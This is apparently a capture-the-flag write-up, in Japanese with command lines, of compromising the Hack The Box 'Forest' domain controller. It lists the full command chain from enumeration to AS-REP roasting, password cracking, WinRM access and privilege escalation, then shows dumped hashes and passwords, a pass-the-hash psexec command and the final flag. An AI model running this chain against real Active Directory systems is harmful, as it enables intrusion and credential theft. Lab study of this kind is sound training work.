rustscan -r 1-65535 -a 10.10.10.161 -- -sV -Pn -A --ulimit 5000

![[Forest image.png]]

![[Forest image 1.png]]

![[Forest image 2.png]]

![[Forest image 3.png]]

./kerbrute_linux_amd64 --dc 10.10.10.161 -d htb.local userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

![[Forest image 4.png]]

crackmapexec smb 10.10.10.161 -u user.txt -p /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt --continue-on-success

＃Nothing

enum4linux -a 10.10.10.161

cat users_raw.txt | cut -d "\[" -f 2 | cut -d "\]" -f 1 > usernames.txt

![[Forest image 5.png]]

**ASREPRoast攻撃**

ASREPRoast 攻撃により、Kerberos事前認証が不要なユーザーを探索し、そのパスワードハッシュの取得を狙います。

impacketモジュール（https://www.secureauth.com/labs/open-source-tools/impacket）のGetNPUsers.pyを使用します。

基本のコマンド構文は、次のとおりです。

impacket-GetNPUsers HTB.local/ -usersfile usernames.txt -format john -outputfile htb-forest.txt -no-pass -dc-ip 10.10.10.161

各オプションの狙いは、次の通りです。

-usersfile: enum4linuxコマンドにて列挙したユーザーリストファイルusernames.txtを使用します。

-format: パスワードハッシュのフォーマットとして、john形式にて出力させます。

-outputfile: 結果をhtb-forest.txtファイルに出力させます。

![[Forest image 6.png]]

![[Forest image 7.png]]

$krb5asrep$svc-alfresco@HTB.LOCAL:cb9f1f0044ca0900c64c281de5bdd2f7$9527ad7334b72b837a31573857ca5bf218272b94cc0b7560b414fd997237d3e93e44adb08302bc75d1a68deb680e381d0996c68626c9a5e218eddfba7d098c8606ff2faa1f815df6eed938344886a418c8d09dfbc8273494a5f5ff69ed55ef6e8ce5cbb9f89204bf5a8e6b76f001b8907ae65da577cf47ee09507ec06fb70bee9b51f7c57387b6cc05d7f726a20da6d459572471382a4afc72a4fb7b30c92811db1cdea62af0df7b73b32620ace1bdb098a43b6fd8affe784ce76fab7bd6b55f799e4204bafcae970f5ac9b636271f76b4b1b5d9fee58025ef03e80a9148e69cef040b299f75

ブルートフォース攻撃

john htb-forest.txt --wordlist=/usr/share/wordlists/rockyou.txt

![[Forest image 8.png]]

svc-alfresco:s3rvice

win-rmサービス

nmap -p5985 10.10.10.161

![[Forest image 9.png]]

侵入

evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice

![[Forest image 10.png]]

権限昇格

SharpHound によるデータ収集

![[Forest image 11.png]]

![[Forest image 12.png]]

Powerviewのダウンロード

https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon

ダウンロードしたスクリプトをサーバにアップロードし読み込ませる

upload PowerView.ps1

import-module .\PowerView.ps1

![[Forest image 13.png]]

net group "Exchange Windows Permissions" svc-alfresco /add

![[Forest image 14.png]]

impacket-ntlmrelayx -t ldap://10.10.10.161 --escalate-user svc-slfresco

impacket-secretsdump htb/svc-alfresco:s3rvice@10.10.10.161

![[Forest image 15.png]]

htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::

impacket-psexec -hashes :32693b11e6aa90eb43d32c72a07ceea6 htb/administrator@10.10.10.161 powershell.exe

![[Forest image 16.png]]

![[Forest image 17.png]]

b61412acfa129d72be5f837e953b2c44